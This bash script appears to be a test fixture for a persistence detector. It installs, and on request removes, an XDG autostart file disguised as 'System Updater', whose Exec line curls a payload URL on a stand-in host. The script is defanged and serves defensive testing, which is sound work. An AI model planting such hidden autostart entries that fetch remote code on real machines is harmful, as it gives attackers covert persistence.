#!/usr/bin/env bash
# XDG autostart persistence: a .desktop file executed on desktop session start.
# The Exec line triggers both the 'bash -c' and 'curl' scan patterns.
# NOTE: if a desktop session is active, the Exec command will be attempted;
# the curl fails immediately since 10.0.0.1 is unreachable.
# Detected by: defender-cli anti-persistence --xdg-autostart
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

DESKTOP="/etc/xdg/autostart/defender-test-updater.desktop"

case "${1:-}" in
  deploy)
    mkdir -p /etc/xdg/autostart
    cat > "$DESKTOP" << 'EOF'
[Desktop Entry]
Type=Application
Name=System Updater
Exec=/bin/bash -c 'curl -s http://10.0.0.1/payload.sh -o /dev/null 2>/dev/null || true'
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF
    echo "[+] 08_xdg_autostart: $DESKTOP installed"
    ;;
  cleanup)
    rm -f "$DESKTOP"
    echo "[-] 08_xdg_autostart: $DESKTOP removed"
    ;;
  *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
esac
